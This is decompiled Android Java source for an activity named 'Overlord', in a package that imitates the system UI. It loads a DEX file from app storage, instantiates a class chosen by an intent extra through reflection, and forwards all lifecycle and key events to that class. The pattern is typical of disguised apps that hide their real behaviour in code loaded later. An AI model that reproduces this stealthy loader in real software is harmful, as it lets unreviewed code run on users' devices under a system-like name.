package com.android.systemui.assis.main;

import android.app.Activity;
import android.content.res.Configuration;
import android.os.Bundle;
import android.view.KeyEvent;
import com.android.systemui.assis.app.MAIN.CONFIG;
import com.android.systemui.assis.core.DexLoader;
import com.android.systemui.assis.datas.security.Guardian.MD5;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class Overlord extends Activity {
    private Class<?> cla;
    private Object object;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String name = getIntent().getStringExtra("class_name");
        try {
            String dexPath = new StringBuilder(String.valueOf(getFilesDir().getAbsolutePath())).append(File.separator).append(CONFIG.DYNAMIC_PACK_NAME).toString();
            this.cla = DexLoader.loadClass(DexLoader.loadDex(this, dexPath, MD5.md5sum(dexPath)), name);
            Constructor<?> constructor = this.cla.getConstructor(new Class[]{Activity.class});
            constructor.setAccessible(true);
            this.object = constructor.newInstance(new Object[]{this});
            invoke("onCreate", Bundle.class, (Object) savedInstanceState);
        } catch (Exception e) {
            finish();
        }
    }

    protected void onRestart() {
        super.onRestart();
        invoke("onRestart");
    }

    protected void onStart() {
        super.onStart();
        invoke("onStart");
    }

    protected void onResume() {
        super.onResume();
        invoke("onResume");
    }

    protected void onPause() {
        super.onPause();
        invoke("onPause");
    }

    protected void onStop() {
        super.onStop();
        invoke("onStop");
    }

    protected void onDestroy() {
        super.onDestroy();
        invoke("onDestroy");
    }

    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        invoke("onConfigurationChanged", Configuration.class, (Object) newConfig);
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        Object obj = invoke("onKeyDown", new Class[]{Integer.TYPE, KeyEvent.class}, new Object[]{Integer.valueOf(keyCode), event});
        if (obj != null && (obj instanceof Boolean)) {
            return ((Boolean) obj).booleanValue();
        }
        return super.onKeyDown(keyCode, event);
    }

    private void invoke(String name) {
        if (!(this.cla == null || this.object == null)) {
            try {
                Method method = this.cla.getDeclaredMethod(name, new Class[0]);
                method.setAccessible(true);
                method.invoke(this.object, new Object[0]);
                return;
            } catch (Exception e) {
            }
        }
        finish();
    }

    private void invoke(String name, Class<?> argClass, Object argObj) {
        if (!(this.cla == null || this.object == null)) {
            try {
                Method method = this.cla.getDeclaredMethod(name, new Class[]{argClass});
                method.setAccessible(true);
                method.invoke(this.object, new Object[]{argObj});
                return;
            } catch (Exception e) {
            }
        }
        finish();
    }

    private Object invoke(String name, Class<?>[] argClass, Object[] argObj) {
        if (!(this.cla == null || this.object == null)) {
            try {
                Method method = this.cla.getDeclaredMethod(name, argClass);
                method.setAccessible(true);
                return method.invoke(this.object, argObj);
            } catch (Exception e) {
            }
        }
        finish();
        return null;
    }
}
